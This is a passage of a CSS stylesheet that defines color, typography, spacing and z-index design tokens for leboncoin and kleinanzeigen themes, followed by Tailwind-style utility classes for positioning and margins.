        --colors-surface-pressed: 244 244 252;
        --colors-surface-focused: 244 244 252;
        --colors-surface-inverse: 37 36 40;
        --colors-on-surface-inverse: 255 255 255;
        --colors-surface-inverse-hovered: 49 48 54;
        --colors-surface-inverse-pressed: 49 48 54;
        --colors-surface-inverse-focused: 49 48 54;
        --colors-outline: 209 208 213;
        --colors-outline-high: 0 0 0;
        --colors-outline-hovered: 33 24 201;
        --colors-outline-pressed: 33 24 201;
        --colors-outline-focused: 209 208 213;
        --colors-overlay: 49 48 54;
        --colors-on-overlay: 255 255 255;
        --font-family-sans: "Nunito Sans", ui-sans-serif, system-ui,
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji",
          "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        --font-family-mono: SFMono-Regular, Menlo, Monaco, Consolas,
          "Liberation Mono", "Courier New", monospace;
        --font-size-display-1-font-size: 4rem;
        --font-size-display-1-line-height: 5.6rem;
        --font-size-display-1-font-weight: 700;
        --font-size-display-1-expanded-font-size: 4.8rem;
        --font-size-display-1-expanded-line-height: 6.4rem;
        --font-size-display-1-expanded-font-weight: 700;
        --font-size-display-2-font-size: 3.2rem;
        --font-size-display-2-line-height: 4.4rem;
        --font-size-display-2-font-weight: 700;
        --font-size-display-2-expanded-font-size: 4rem;
        --font-size-display-2-expanded-line-height: 5.6rem;
        --font-size-display-2-expanded-font-weight: 700;
        --font-size-display-3-font-size: 2.4rem;
        --font-size-display-3-line-height: 3.2rem;
        --font-size-display-3-font-weight: 700;
        --font-size-display-3-expanded-font-size: 3.2rem;
        --font-size-display-3-expanded-line-height: 4.4rem;
        --font-size-display-3-expanded-font-weight: 700;
        --font-size-headline-1-font-size: 2rem;
        --font-size-headline-1-line-height: 2.8rem;
        --font-size-headline-1-font-weight: 700;
        --font-size-headline-1-expanded-font-size: 2.4rem;
        --font-size-headline-1-expanded-line-height: 3.2rem;
        --font-size-headline-1-expanded-font-weight: 700;
        --font-size-headline-2-font-size: 1.8rem;
        --font-size-headline-2-line-height: 2.4rem;
        --font-size-headline-2-font-weight: 700;
        --font-size-headline-2-expanded-font-size: 2rem;
        --font-size-headline-2-expanded-line-height: 2.8rem;
        --font-size-headline-2-expanded-font-weight: 700;
        --font-size-subhead-font-size: 1.6rem;
        --font-size-subhead-line-height: 2.4rem;
        --font-size-subhead-font-weight: 700;
        --font-size-subhead-expanded-font-size: 1.6rem;
        --font-size-subhead-expanded-line-height: 2.4rem;
        --font-size-subhead-expanded-font-weight: 700;
        --font-size-body-1-font-size: 1.6rem;
        --font-size-body-1-line-height: 2.4rem;
        --font-size-body-2-font-size: 1.4rem;
        --font-size-body-2-line-height: 2rem;
        --font-size-caption-font-size: 1.2rem;
        --font-size-caption-line-height: 1.6rem;
        --font-size-small-font-size: 1rem;
        --font-size-small-line-height: 1.4rem;
        --font-size-body-1-link-font-size: 1.6rem;
        --font-size-body-1-link-line-height: 2.4rem;
        --font-size-body-2-link-font-size: 1.4rem;
        --font-size-body-2-link-line-height: 1.8rem;
        --font-size-caption-link-font-size: 1.2rem;
        --font-size-caption-link-line-height: 1.6rem;
        --font-size-callout-font-size: 1.6rem;
        --font-size-callout-line-height: 2.4rem;
        --font-weight-regular: 400;
        --font-weight-medium: 500;
        --font-weight-semi-bold: 600;
        --font-weight-bold: 700;
        --opacity-0: 0;
        --opacity-none: 1;
        --opacity-dim-1: 0.72;
        --opacity-dim-2: 0.56;
        --opacity-dim-3: 0.4;
        --opacity-dim-4: 0.16;
        --opacity-dim-5: 0.08;
        --screens-sm: 640px;
        --screens-md: 768px;
        --screens-lg: 1024px;
        --screens-xl: 1280px;
        --spacing-auto: auto;
        --spacing-none: 0px;
        --spacing-sm: 0.4rem;
        --spacing-md: 0.8rem;
        --spacing-lg: 1.6rem;
        --spacing-xl: 2.4rem;
        --spacing-2xl: 3.2rem;
        --spacing-3xl: 4rem;
        --z-index-hide: -1;
        --z-index-base: 0;
        --z-index-raised: 1;
        --z-index-dropdown: 1000;
        --z-index-sticky: 1100;
        --z-index-overlay: 1300;
        --z-index-modal: 1400;
        --z-index-popover: 1500;
        --z-index-skip-link: 1600;
        --z-index-toast: 1700;
        --z-index-tooltip: 1800;
      }

      [data-theme="leboncoin"] {
        --colors-basic: 8 54 93;
        --colors-basic-hovered: 8 54 93;
        --colors-basic-pressed: 8 54 93;
        --colors-basic-focused: 8 54 93;
        --colors-basic-container: 217 235 252;
        --colors-on-basic-container: 6 35 61;
        --colors-basic-container-hovered: 231 243 253;
        --colors-basic-container-pressed: 231 243 253;
        --colors-basic-container-focused: 217 235 252;
        --colors-accent: 133 38 217;
        --colors-on-accent: 255 255 255;
        --colors-accent-hovered: 159 71 235;
        --colors-accent-pressed: 159 71 235;
        --colors-accent-focused: 133 38 217;
        --colors-accent-container: 233 214 250;
        --colors-on-accent-container: 54 15 87;
        --colors-accent-container-hovered: 243 229 255;
        --colors-accent-container-pressed: 243 229 255;
        --colors-accent-container-focused: 233 214 250;
        --colors-accent-variant: 80 23 130;
        --colors-accent-variant-hovered: 107 31 173;
        --colors-accent-variant-pressed: 107 31 173;
        --colors-accent-variant-focused: 80 23 130;
        --colors-main: 236 90 19;
        --colors-main-hovered: 240 123 66;
        --colors-main-pressed: 240 123 66;
        --colors-main-focused: 236 90 19;
        --colors-main-container: 251 223 209;
        --colors-on-main-container: 137 56 15;
        --colors-main-container-hovered: 253 239 232;
        --colors-main-container-pressed: 253 239 232;
        --colors-main-container-focused: 251 223 209;
        --colors-main-variant: 184 74 20;
        --colors-main-variant-hovered: 236 90 19;
        --colors-main-variant-pressed: 236 90 19;
        --colors-main-variant-focused: 184 74 20;
        --colors-support: 6 35 61;
        --colors-support-hovered: 8 54 93;
        --colors-support-pressed: 8 54 93;
        --colors-support-focused: 6 35 61;
        --colors-support-container: 240 245 250;
        --colors-on-support-container: 6 35 61;
        --colors-support-container-hovered: 231 243 253;
        --colors-support-container-pressed: 231 243 253;
        --colors-support-container-focused: 240 245 250;
        --colors-support-variant: 78 101 121;
        --colors-support-variant-hovered: 98 124 147;
        --colors-support-variant-pressed: 98 124 147;
        --colors-support-variant-focused: 78 101 121;
        --colors-success: 78 152 80;
        --colors-success-hovered: 113 173 115;
        --colors-success-pressed: 113 173 115;
        --colors-success-focused: 78 152 80;
        --colors-success-container: 220 234 220;
        --colors-on-success-container: 47 91 48;
        --colors-success-container-hovered: 237 245 238;
        --colors-success-container-pressed: 237 245 238;
        --colors-success-container-focused: 220 234 220;
        --colors-alert: 255 170 0;
        --colors-on-alert: 20 25 31;
        --colors-alert-hovered: 255 187 51;
        --colors-alert-pressed: 255 187 51;
        --colors-alert-focused: 255 170 0;
        --colors-alert-container: 255 238 204;
        --colors-on-alert-container: 153 102 0;
        --colors-alert-container-hovered: 255 246 229;
        --colors-alert-container-pressed: 255 246 229;
        --colors-alert-container-focused: 255 238 204;
        --colors-error: 217 52 38;
        --colors-error-hovered: 224 93 82;
        --colors-error-pressed: 224 93 82;
        --colors-error-focused: 217 52 38;
        --colors-error-container: 247 215 212;
        --colors-on-error-container: 130 32 23;
        --colors-error-container-hovered: 251 236 235;
        --colors-error-container-pressed: 251 236 235;
        --colors-error-container-focused: 247 215 212;
        --colors-info: 19 136 236;
        --colors-info-hovered: 66 159 240;
        --colors-info-pressed: 66 159 240;
        --colors-info-focused: 19 136 236;
        --colors-info-container: 207 230 251;
        --colors-on-info-container: 11 81 142;
        --colors-info-container-hovered: 231 243 253;
        --colors-info-container-pressed: 231 243 253;
        --colors-info-container-focused: 207 230 251;
        --colors-neutral: 98 124 147;
        --colors-neutral-hovered: 127 149 169;
        --colors-neutral-pressed: 127 149 169;
        --colors-neutral-focused: 98 124 147;
        --colors-neutral-container: 240 245 250;
        --colors-on-neutral-container: 61 77 92;
        --colors-neutral-container-hovered: 240 245 250;
        --colors-neutral-container-pressed: 240 245 250;
        --colors-neutral-container-focused: 240 245 250;
        --colors-on-background: 6 35 61;
        --colors-on-background-variant: 6 35 61;
        --colors-on-surface: 6 35 61;
        --colors-surface-hovered: 240 245 250;
        --colors-surface-pressed: 240 245 250;
        --colors-surface-focused: 255 255 255;
        --colors-surface-inverse: 6 35 61;
        --colors-surface-inverse-hovered: 8 54 93;
        --colors-surface-inverse-pressed: 8 54 93;
        --colors-surface-inverse-focused: 6 35 61;
        --colors-outline: 163 180 194;
        --colors-outline-high: 6 35 61;
        --colors-outline-hovered: 6 35 61;
        --colors-outline-pressed: 6 35 61;
        --colors-outline-focused: 163 180 194;
        --colors-overlay: 20 25 31;
      }

      [data-theme="kleinanzeigen"] {
        --colors-basic: 29 75 0;
        --colors-basic-hovered: 50 105 22;
        --colors-basic-pressed: 50 105 22;
        --colors-basic-focused: 29 75 0;
        --colors-basic-container: 211 242 141;
        --colors-on-basic-container: 17 45 0;
        --colors-basic-container-hovered: 247 253 235;
        --colors-basic-container-pressed: 247 253 235;
        --colors-basic-container-focused: 211 242 141;
        --colors-accent: 90 51 174;
        --colors-on-accent: 255 255 255;
        --colors-accent-hovered: 134 89 228;
        --colors-accent-pressed: 134 89 228;
        --colors-accent-focused: 90 51 174;
        --colors-accent-container: 224 209 255;
        --colors-on-accent-container: 55 25 117;
        --colors-accent-container-hovered: 242 236 255;
        --colors-accent-container-pressed: 242 236 255;
        --colors-accent-container-focused: 224 209 255;
        --colors-accent-variant: 67 35 135;
        --colors-accent-variant-hovered: 90 51 174;
        --colors-accent-variant-pressed: 90 51 174;
        --colors-accent-variant-focused: 67 35 135;
        --colors-main: 181 233 65;
        --colors-on-main: 29 75 0;
        --colors-main-hovered: 211 242 141;
        --colors-main-pressed: 211 242 141;
        --colors-main-focused: 181 233 65;
        --colors-main-container: 233 248 198;
        --colors-on-main-container: 29 75 0;
        --colors-main-container-hovered: 247 253 235;
        --colors-main-container-pressed: 247 253 235;
        --colors-main-container-focused: 233 248 198;
        --colors-main-variant: 96 159 40;
        --colors-main-variant-hovered: 136 204 40;
        --colors-main-variant-pressed: 136 204 40;
        --colors-main-variant-focused: 96 159 40;
        --colors-support: 29 75 0;
        --colors-support-hovered: 50 105 22;
        --colors-support-pressed: 50 105 22;
        --colors-support-focused: 29 75 0;
        --colors-support-container: 211 242 141;
        --colors-on-support-container: 17 45 0;
        --colors-support-container-hovered: 247 253 235;
        --colors-support-container-pressed: 247 253 235;
        --colors-support-container-focused: 211 242 141;
        --colors-support-variant: 17 45 0;
        --colors-support-variant-hovered: 29 75 0;
        --colors-support-variant-pressed: 29 75 0;
        --colors-support-variant-focused: 17 45 0;
        --colors-success: 50 105 22;
        --colors-success-hovered: 96 159 40;
        --colors-success-pressed: 96 159 40;
        --colors-success-focused: 50 105 22;
        --colors-success-container: 233 248 198;
        --colors-on-success-container: 50 105 22;
        --colors-success-container-hovered: 247 253 235;
        --colors-success-container-pressed: 247 253 235;
        --colors-success-container-focused: 233 248 198;
        --colors-alert: 255 167 63;
        --colors-on-alert: 12 12 11;
        --colors-alert-hovered: 255 183 99;
        --colors-alert-pressed: 255 183 99;
        --colors-alert-focused: 255 167 63;
        --colors-alert-container: 255 203 141;
        --colors-on-alert-container: 99 57 8;
        --colors-alert-container-hovered: 255 234 209;
        --colors-alert-container-pressed: 255 234 209;
        --colors-alert-container-focused: 255 203 141;
        --colors-error: 179 12 12;
        --colors-error-hovered: 215 34 34;
        --colors-error-pressed: 215 34 34;
        --colors-error-focused: 179 12 12;
        --colors-error-container: 255 170 170;
        --colors-on-error-container: 85 0 0;
        --colors-error-container-hovered: 255 215 215;
        --colors-error-container-pressed: 255 215 215;
        --colors-error-container-focused: 255 170 170;
        --colors-info: 90 51 174;
        --colors-info-hovered: 134 89 228;
        --colors-info-pressed: 134 89 228;
        --colors-info-focused: 90 51 174;
        --colors-info-container: 224 209 255;
        --colors-on-info-container: 67 35 135;
        --colors-info-container-hovered: 242 236 255;
        --colors-info-container-pressed: 242 236 255;
        --colors-info-container-focused: 224 209 255;
        --colors-neutral: 80 78 72;
        --colors-neutral-hovered: 221 219 213;
        --colors-neutral-pressed: 221 219 213;
        --colors-neutral-focused: 80 78 72;
        --colors-neutral-container: 244 242 239;
        --colors-on-neutral-container: 80 78 72;
        --colors-neutral-container-hovered: 247 247 247;
        --colors-neutral-container-pressed: 247 247 247;
        --colors-neutral-container-focused: 244 242 239;
        --colors-on-background: 12 12 11;
        --colors-background-variant: 244 242 239;
        --colors-on-background-variant: 51 50 46;
        --colors-on-surface: 12 12 11;
        --colors-surface-hovered: 244 242 239;
        --colors-surface-pressed: 244 242 239;
        --colors-surface-focused: 255 255 255;
        --colors-surface-inverse: 12 12 11;
        --colors-surface-inverse-hovered: 32 31 29;
        --colors-surface-inverse-pressed: 32 31 29;
        --colors-surface-inverse-focused: 12 12 11;
        --colors-outline: 190 188 183;
        --colors-outline-high: 159 157 152;
        --colors-outline-hovered: 221 219 213;
        --colors-outline-pressed: 221 219 213;
        --colors-outline-focused: 190 188 183;
        --colors-overlay: 12 12 11;
      }

      [data-theme="leboncoin-pro"] {
        --colors-basic: 8 54 93;
        --colors-basic-hovered: 8 54 93;
        --colors-basic-pressed: 8 54 93;
        --colors-basic-focused: 8 54 93;
        --colors-basic-container: 217 235 252;
        --colors-on-basic-container: 6 35 61;
        --colors-basic-container-hovered: 231 243 253;
        --colors-basic-container-pressed: 231 243 253;
        --colors-basic-container-focused: 217 235 252;
        --colors-accent: 133 38 217;
        --colors-on-accent: 255 255 255;
        --colors-accent-hovered: 159 71 235;
        --colors-accent-pressed: 159 71 235;
        --colors-accent-focused: 133 38 217;
        --colors-accent-container: 233 214 250;
        --colors-on-accent-container: 54 15 87;
        --colors-accent-container-hovered: 243 229 255;
        --colors-accent-container-pressed: 243 229 255;
        --colors-accent-container-focused: 233 214 250;
        --colors-accent-variant: 80 23 130;
        --colors-accent-variant-hovered: 107 31 173;
        --colors-accent-variant-pressed: 107 31 173;
        --colors-accent-variant-focused: 80 23 130;
        --colors-main: 15 108 189;
        --colors-main-hovered: 66 159 240;
        --colors-main-pressed: 66 159 240;
        --colors-main-focused: 15 108 189;
        --colors-main-container: 231 243 253;
        --colors-on-main-container: 11 81 142;
        --colors-main-container-hovered: 231 243 253;
        --colors-main-container-pressed: 231 243 253;
        --colors-main-container-focused: 231 243 253;
        --colors-main-variant: 11 81 142;
        --colors-main-variant-hovered: 19 136 236;
        --colors-main-variant-pressed: 19 136 236;
        --colors-main-variant-focused: 11 81 142;
        --colors-support: 6 35 61;
        --colors-support-hovered: 8 54 93;
        --colors-support-pressed: 8 54 93;
        --colors-support-focused: 6 35 61;
        --colors-support-container: 240 245 250;
        --colors-on-support-container: 6 35 61;
        --colors-support-container-hovered: 231 243 253;
        --colors-support-container-pressed: 231 243 253;
        --colors-support-container-focused: 240 245 250;
        --colors-support-variant: 78 101 121;
        --colors-support-variant-hovered: 98 124 147;
        --colors-support-variant-pressed: 98 124 147;
        --colors-support-variant-focused: 78 101 121;
        --colors-success: 78 152 80;
        --colors-success-hovered: 113 173 115;
        --colors-success-pressed: 113 173 115;
        --colors-success-focused: 78 152 80;
        --colors-success-container: 220 234 220;
        --colors-on-success-container: 47 91 48;
        --colors-success-container-hovered: 237 245 238;
        --colors-success-container-pressed: 237 245 238;
        --colors-success-container-focused: 220 234 220;
        --colors-alert: 255 170 0;
        --colors-on-alert: 20 25 31;
        --colors-alert-hovered: 255 187 51;
        --colors-alert-pressed: 255 187 51;
        --colors-alert-focused: 255 170 0;
        --colors-alert-container: 255 238 204;
        --colors-on-alert-container: 153 102 0;
        --colors-alert-container-hovered: 255 246 229;
        --colors-alert-container-pressed: 255 246 229;
        --colors-alert-container-focused: 255 238 204;
        --colors-error: 217 52 38;
        --colors-error-hovered: 224 93 82;
        --colors-error-pressed: 224 93 82;
        --colors-error-focused: 217 52 38;
        --colors-error-container: 247 215 212;
        --colors-on-error-container: 130 32 23;
        --colors-error-container-hovered: 251 236 235;
        --colors-error-container-pressed: 251 236 235;
        --colors-error-container-focused: 247 215 212;
        --colors-info: 19 136 236;
        --colors-info-hovered: 66 159 240;
        --colors-info-pressed: 66 159 240;
        --colors-info-focused: 19 136 236;
        --colors-info-container: 207 230 251;
        --colors-on-info-container: 11 81 142;
        --colors-info-container-hovered: 231 243 253;
        --colors-info-container-pressed: 231 243 253;
        --colors-info-container-focused: 207 230 251;
        --colors-neutral: 98 124 147;
        --colors-neutral-hovered: 127 149 169;
        --colors-neutral-pressed: 127 149 169;
        --colors-neutral-focused: 98 124 147;
        --colors-neutral-container: 240 245 250;
        --colors-on-neutral-container: 61 77 92;
        --colors-neutral-container-hovered: 240 245 250;
        --colors-neutral-container-pressed: 240 245 250;
        --colors-neutral-container-focused: 240 245 250;
        --colors-on-background: 6 35 61;
        --colors-on-background-variant: 6 35 61;
        --colors-on-surface: 6 35 61;
        --colors-surface-hovered: 240 245 250;
        --colors-surface-pressed: 240 245 250;
        --colors-surface-focused: 255 255 255;
        --colors-surface-inverse: 6 35 61;
        --colors-surface-inverse-hovered: 8 54 93;
        --colors-surface-inverse-pressed: 8 54 93;
        --colors-surface-inverse-focused: 6 35 61;
        --colors-outline: 163 180 194;
        --colors-outline-high: 6 35 61;
        --colors-outline-hovered: 6 35 61;
        --colors-outline-pressed: 6 35 61;
        --colors-outline-focused: 163 180 194;
        --colors-overlay: 20 25 31;
      }

      [data-theme="kleinanzeigen-pro"] {
        --colors-basic: 29 75 0;
        --colors-basic-hovered: 50 105 22;
        --colors-basic-pressed: 50 105 22;
        --colors-basic-focused: 29 75 0;
        --colors-basic-container: 211 242 141;
        --colors-on-basic-container: 17 45 0;
        --colors-basic-container-hovered: 247 253 235;
        --colors-basic-container-pressed: 247 253 235;
        --colors-basic-container-focused: 211 242 141;
        --colors-accent: 90 51 174;
        --colors-on-accent: 255 255 255;
        --colors-accent-hovered: 134 89 228;
        --colors-accent-pressed: 134 89 228;
        --colors-accent-focused: 90 51 174;
        --colors-accent-container: 224 209 255;
        --colors-on-accent-container: 55 25 117;
        --colors-accent-container-hovered: 242 236 255;
        --colors-accent-container-pressed: 242 236 255;
        --colors-accent-container-focused: 224 209 255;
        --colors-accent-variant: 67 35 135;
        --colors-accent-variant-hovered: 90 51 174;
        --colors-accent-variant-pressed: 90 51 174;
        --colors-accent-variant-focused: 67 35 135;
        --colors-main: 181 233 65;
        --colors-on-main: 29 75 0;
        --colors-main-hovered: 211 242 141;
        --colors-main-pressed: 211 242 141;
        --colors-main-focused: 181 233 65;
        --colors-main-container: 233 248 198;
        --colors-on-main-container: 29 75 0;
        --colors-main-container-hovered: 247 253 235;
        --colors-main-container-pressed: 247 253 235;
        --colors-main-container-focused: 233 248 198;
        --colors-main-variant: 96 159 40;
        --colors-main-variant-hovered: 136 204 40;
        --colors-main-variant-pressed: 136 204 40;
        --colors-main-variant-focused: 96 159 40;
        --colors-support: 29 75 0;
        --colors-support-hovered: 50 105 22;
        --colors-support-pressed: 50 105 22;
        --colors-support-focused: 29 75 0;
        --colors-support-container: 211 242 141;
        --colors-on-support-container: 17 45 0;
        --colors-support-container-hovered: 247 253 235;
        --colors-support-container-pressed: 247 253 235;
        --colors-support-container-focused: 211 242 141;
        --colors-support-variant: 17 45 0;
        --colors-support-variant-hovered: 29 75 0;
        --colors-support-variant-pressed: 29 75 0;
        --colors-support-variant-focused: 17 45 0;
        --colors-success: 50 105 22;
        --colors-success-hovered: 96 159 40;
        --colors-success-pressed: 96 159 40;
        --colors-success-focused: 50 105 22;
        --colors-success-container: 233 248 198;
        --colors-on-success-container: 50 105 22;
        --colors-success-container-hovered: 247 253 235;
        --colors-success-container-pressed: 247 253 235;
        --colors-success-container-focused: 233 248 198;
        --colors-alert: 255 167 63;
        --colors-on-alert: 12 12 11;
        --colors-alert-hovered: 255 183 99;
        --colors-alert-pressed: 255 183 99;
        --colors-alert-focused: 255 167 63;
        --colors-alert-container: 255 203 141;
        --colors-on-alert-container: 99 57 8;
        --colors-alert-container-hovered: 255 234 209;
        --colors-alert-container-pressed: 255 234 209;
        --colors-alert-container-focused: 255 203 141;
        --colors-error: 179 12 12;
        --colors-error-hovered: 215 34 34;
        --colors-error-pressed: 215 34 34;
        --colors-error-focused: 179 12 12;
        --colors-error-container: 255 170 170;
        --colors-on-error-container: 85 0 0;
        --colors-error-container-hovered: 255 215 215;
        --colors-error-container-pressed: 255 215 215;
        --colors-error-container-focused: 255 170 170;
        --colors-info: 90 51 174;
        --colors-info-hovered: 134 89 228;
        --colors-info-pressed: 134 89 228;
        --colors-info-focused: 90 51 174;
        --colors-info-container: 224 209 255;
        --colors-on-info-container: 67 35 135;
        --colors-info-container-hovered: 242 236 255;
        --colors-info-container-pressed: 242 236 255;
        --colors-info-container-focused: 224 209 255;
        --colors-neutral: 80 78 72;
        --colors-neutral-hovered: 221 219 213;
        --colors-neutral-pressed: 221 219 213;
        --colors-neutral-focused: 80 78 72;
        --colors-neutral-container: 244 242 239;
        --colors-on-neutral-container: 80 78 72;
        --colors-neutral-container-hovered: 247 247 247;
        --colors-neutral-container-pressed: 247 247 247;
        --colors-neutral-container-focused: 244 242 239;
        --colors-on-background: 12 12 11;
        --colors-background-variant: 244 242 239;
        --colors-on-background-variant: 51 50 46;
        --colors-on-surface: 12 12 11;
        --colors-surface-hovered: 244 242 239;
        --colors-surface-pressed: 244 242 239;
        --colors-surface-focused: 255 255 255;
        --colors-surface-inverse: 12 12 11;
        --colors-surface-inverse-hovered: 32 31 29;
        --colors-surface-inverse-pressed: 32 31 29;
        --colors-surface-inverse-focused: 12 12 11;
        --colors-outline: 190 188 183;
        --colors-outline-high: 159 157 152;
        --colors-outline-hovered: 221 219 213;
        --colors-outline-pressed: 221 219 213;
        --colors-outline-focused: 190 188 183;
        --colors-overlay: 12 12 11;
      }

      :root {
        --sz-0: 0rem;
        --sz-1: 0.1rem;
        --sz-2: 0.2rem;
        --sz-4: 0.4rem;
        --sz-6: 0.6rem;
        --sz-8: 0.8rem;
        --sz-10: 1rem;
        --sz-12: 1.2rem;
        --sz-14: 1.4rem;
        --sz-16: 1.6rem;
        --sz-20: 2rem;
        --sz-24: 2.4rem;
        --sz-28: 2.8rem;
        --sz-32: 3.2rem;
        --sz-36: 3.6rem;
        --sz-40: 4rem;
        --sz-44: 4.4rem;
        --sz-48: 4.8rem;
        --sz-56: 5.6rem;
        --sz-64: 6.4rem;
        --sz-80: 8rem;
        --sz-96: 9.6rem;
        --sz-112: 11.2rem;
        --sz-128: 12.8rem;
        --sz-144: 14.4rem;
        --sz-160: 16rem;
        --sz-176: 17.6rem;
        --sz-192: 19.2rem;
        --sz-208: 20.8rem;
        --sz-224: 22.4rem;
        --sz-240: 24rem;
        --sz-256: 25.6rem;
        --sz-288: 28.8rem;
        --sz-320: 32rem;
        --sz-384: 38.4rem;
        --sz-400: 40rem;
        --sz-416: 41.6rem;
        --sz-432: 43.2rem;
        --sz-448: 44.8rem;
        --sz-464: 46.4rem;
        --sz-480: 48rem;
        --sz-512: 51.2rem;
        --sz-544: 54.4rem;
        --sz-576: 57.6rem;
        --sz-608: 60.8rem;
        --sz-640: 64rem;
        --sz-672: 67.2rem;
        --sz-704: 70.4rem;
        --sz-736: 73.6rem;
        --sz-768: 76.8rem;
        --sz-800: 80rem;
        --sz-832: 83.2rem;
        --sz-864: 86.4rem;
      }

      ::-webkit-backdrop {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: #3b82f680;
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
      }

      ::backdrop {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: #3b82f680;
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
      }

      .container {
        width: 100%;
      }

      @media (min-width: 640px) {
        .container {
          max-width: 640px;
        }
      }

      @media (min-width: 768px) {
        .container {
          max-width: 768px;
        }
      }

      @media (min-width: 1024px) {
        .container {
          max-width: 1024px;
        }
      }

      @media (min-width: 1280px) {
        .container {
          max-width: 1280px;
        }
      }

      .pointer-events-none {
        pointer-events: none;
      }

      .pointer-events-auto {
        pointer-events: auto;
      }

      .visible {
        visibility: visible;
      }

      .invisible {
        visibility: hidden;
      }

      .static {
        position: static;
      }

      .fixed {
        position: fixed;
      }

      .absolute {
        position: absolute;
      }

      .relative {
        position: relative;
      }

      .sticky {
        position: -webkit-sticky;
        position: sticky;
      }

      .-top-md {
        top: calc(var(--spacing-md) * -1);
      }

      .bottom-none {
        bottom: var(--spacing-none);
      }

      .left-1\/2 {
        left: 50%;
      }

      .left-lg {
        left: var(--spacing-lg);
      }

      .left-none {
        left: var(--spacing-none);
      }

      .left-xl {
        left: var(--spacing-xl);
      }

      .right-3xl {
        right: var(--spacing-3xl);
      }

      .right-lg {
        right: var(--spacing-lg);
      }

      .right-md {
        right: var(--spacing-md);
      }

      .right-none {
        right: var(--spacing-none);
      }

      .right-xl {
        right: var(--spacing-xl);
      }

      .top-1\/2 {
        top: 50%;
      }

      .top-\[11rem\] {
        top: 11rem;
      }

      .top-\[calc\(var\(--sz-44\)\/2\)\] {
        top: calc(var(--sz-44) / 2);
      }

      .top-md {
        top: var(--spacing-md);
      }

      .top-none {
        top: var(--spacing-none);
      }

      .z-base {
        z-index: var(--z-index-base);
      }

      .z-modal {
        z-index: var(--z-index-modal);
      }

      .z-overlay {
        z-index: var(--z-index-overlay);
      }

      .z-popover {
        z-index: var(--z-index-popover);
      }

      .z-raised {
        z-index: var(--z-index-raised);
      }

      .col-span-2 {
        grid-column: span 2 / span 2;
      }

      .col-span-3 {
        grid-column: span 3 / span 3;
      }

      .m-3xl {
        margin: var(--spacing-3xl);
      }

      .m-xl {
        margin: var(--spacing-xl);
      }

      .mx-auto {
        margin-left: var(--spacing-auto);
        margin-right: var(--spacing-auto);
      }

      .mx-lg {
        margin-left: var(--spacing-lg);
        margin-right: var(--spacing-lg);
      }

      .my-2xl {
        margin-top: var(--spacing-2xl);
        margin-bottom: var(--spacing-2xl);
      }

      .my-lg {
        margin-top: var(--spacing-lg);
        margin-bottom: var(--spacing-lg);
      }

      .my-md {
        margin-top: var(--spacing-md);
        margin-bottom: var(--spacing-md);
      }

      .my-none {
        margin-top: var(--spacing-none);
        margin-bottom: var(--spacing-none);
      }

      .my-sm {
        margin-top: var(--spacing-sm);
        margin-bottom: var(--spacing-sm);
      }

      .my-xl {
        margin-top: var(--spacing-xl);
        margin-bottom: var(--spacing-xl);
      }

      .-ml-lg {
        margin-left: calc(var(--spacing-lg) * -1);
      }

      .mb-2xl {
        margin-bottom: var(--spacing-2xl);
      }

      .mb-3xl {
        margin-bottom: var(--spacing-3xl);
      }

      .mb-lg {
        margin-bottom: var(--spacing-lg);
      }

      .mb-md {
        margin-bottom: var(--spacing-md);
      }

      .mb-sm {
        margin-bottom: var(--spacing-sm);
      }

      .mb-xl {
        margin-bottom: var(--spacing-xl);
      }

      .ml-\[-1px\] {
        margin-left: -1px;
      }

      .ml-auto {
        margin-left: var(--spacing-auto);
      }

      .ml-lg {
        margin-left: var(--spacing-lg);
      }

